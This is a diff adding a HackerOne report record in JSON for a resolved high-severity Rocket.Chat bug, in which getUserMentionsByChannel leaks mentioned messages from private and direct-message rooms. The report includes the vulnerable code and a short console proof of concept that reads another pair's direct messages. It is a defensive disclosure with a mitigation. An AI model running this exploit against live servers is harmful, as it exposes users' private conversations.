@@ -1,0 +1,139 @@
+{
+  "id": 1410246,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEwMjQ2",
+  "url": "https://hackerone.com/reports/1410246",
+  "title": "getUserMentionsByChannel leaks messages with mention from private channel",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-11-25T15:00:53.635Z",
+  "submitted_at": "2021-11-25T15:00:53.724Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gronke",
+    "url": "/gronke",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [
+    "CVE-2022-35249",
+    "CVE-2022-32220"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-09-22T16:01:13.414Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-22T12:02:08.461Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-10-22T12:02:08.576Z",
+  "allow_singular_disclosure_after": -111899251.1590913,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "defenderwww",
+    "shreyaschavhan",
+    "shivammusic"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 194875,
+      "category": "team",
+      "content": "## Summary\n\nThe `getUserMentionsByChannel` meteor server method discloses messages from private channels and direct messages regardless of the users access permission to the room.\n\n## Description\n\nWhen calling the `getUserMentionsByChannel` method, the server does not check the users access to the given room and returns all messages the user has been mentioned in.\n\n```javascript\nMeteor.call(\n  \"getUserMentionsByChannel\",\n  { roomId: \"<TARGET_ROOM>\" },\n  console.log\n);\n```\n\nThe issue was found in [app/mentions/server/methods/getUserMentionsByChannel.js#L7-L23](https://github.com/RocketChat/Rocket.Chat/blob/194a600f31a1037716ac4de297cfff0b8a4f9942/app/mentions/server/methods/getUserMentionsByChannel.js#L7-L23) where roomId is verified to be a String only.\n\n```javascript\nMeteor.methods({\n\tgetUserMentionsByChannel({ roomId, options }) {\n\t\tcheck(roomId, String);\n\n\t\tif (!Meteor.userId()) {\n\t\t\tthrow new Meteor.Error('error-invalid-user', 'Invalid user', { method: 'getUserMentionsByChannel' });\n\t\t}\n\n\t\tconst room = Rooms.findOneById(roomId);\n\n\t\tif (!room) {\n\t\t\tthrow new Meteor.Error('error-invalid-room', 'Invalid room', { method: 'getUserMentionsByChannel' });\n\t\t}\n\n\t\tconst user = Users.findOneById(Meteor.userId());\n\n\t\treturn Messages.findVisibleByMentionAndRoomId(user.username, roomId, options).fetch();\n\t},\n});\n```\n\nThe server will return all messages the requesting user has been @ mentioned in.\n\n## Releases Affected:\n\n  * `4.1.2`\n  * `3.18.3`\n  * First [99065f7518bc88341210c0e38678bc3c97e3b58a](https://github.com/RocketChat/Rocket.Chat/blob/99065f7518bc88341210c0e38678bc3c97e3b58a/packages/rocketchat-mentions/server/methods/getUserMentionsByChannel.js) (12.03.2018)\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n1. Login to Rocket.Chat\n2. Obtain Room Id\n   1. Guess Direct Message roomId from User IDs\n   2. Leak private Message ID with unknown vulnerability\n3. Call `getUserMentionsByChannel` with given `{ roomId: \"<Value>\" }`\n4. Read messages where the own user was mentioned in console.log output\n\n## Supporting Material/References:\n\nThe following example leks a private message between two users to a third account `trudy` who performs the requests from the authenticated client disclosing a direct message between `alice` and `bob`.\n\n```javascript\nMeteor.user().username\n// > 'trudy'\nlet alice = 'kYfzDMQLyPFjS9ASb';\nlet bob = 'zZnrfd2RvcWhspr6S';\nMeteor.call(\n  \"getUserMentionsByChannel\",\n  { roomId: `${alice}${bob} }, // direct message channel\n  (err, data) => console.log(\n  \tdata\n  \t  .map((m) => `${m._id} ${m.u.username} (${m.ts.toGMTString()}): ${m.msg}`)\n  \t  .join(\"\\n\")\n  )\n);\n// > Yp6NoMZk34mnQZiBR alice (Thu, 25 Nov 2021 14:17:25 UTC): Mention @trudy somewhere\n\nMeteor.call(\"getMessages\", [\"Yp6NoMZk34mnQZiBR\"], (err, data) => console.log(err.message))\n// > Not allowed [error-not-allowed]\n```\n\n## Suggested mitigation\n\n  * Check for permission to read messages from the room given in in `{ roomId }` method argument.\n\n## Impact\n\nAuthenticated users can disclose all messages they were mentioned in from private channels and direct messages they should not have access to.\n\n\n## Fixed in\n\nWe have fix this issue in version 5.0>",
+      "updated_at": "2022-09-22T12:01:41.319Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1989106,
+        "username": "mrd0d",
+        "name": "Offsec team engineer",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-09-27T20:52:41.370Z",
+        "url": "https://hackerone.com/mrd0d",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150939Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a1e42e687d22e79296b833baf284a049227d90132149d1b38cba9238a228f1b",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150939Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=24dc7a3e44a4d6066ee33c25c95ff1af84b15cfa7bd744aa77c9acb81f348985",
+          "xtralarge": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/fba683f28d17594d98b39d87e2b3aa09acb938c22d49b206f663ae961dc39adc?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150939Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=723a5af4acb900eeb1aefe6925924a2173599dbb14df2d7c980a31cb5679ad70"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
